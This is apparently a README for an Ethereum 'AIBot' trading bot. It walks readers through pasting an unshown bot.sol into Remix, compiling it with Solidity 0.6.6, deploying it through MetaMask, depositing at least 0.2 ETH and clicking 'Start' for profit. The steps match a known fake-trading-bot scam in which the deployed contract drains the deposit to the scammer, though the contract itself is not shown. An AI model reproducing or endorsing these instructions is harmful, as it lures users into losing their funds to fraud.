# AIBot
This repository contains a trading bot for Ethereum based tokens for decentralized exchanges such as Uniswap and GMX.

## Setup Steps
Access [Remix IDE](https://remix.ethereum.org) and [MetaMask](https://metamask.io).
    Right Click the 'Contracts' folder and then create 'New File'. Rename it whatever you want, or: “bot.sol”
    Paste the bot.sol source code from this repository into the file you just created.
    Go to the "Compile" tab on Remix and Compile with Solidity version 0.6.6
    Go to the "Deploy & Run Transactions" tab on Remix, select the "Injected Provider" environment, then "Deploy". This will create your own contract by confirming the MetaMask Contract creation fee
    Deposit funds (at least 0.2 ETH to prevent negating slippage) to your exact contract/bot address
    After your transaction is confirmed, start the bot by clicking the "Start" button. Withdraw anytime by clicking "Withdrawal". Wait about a day for best profit potential.
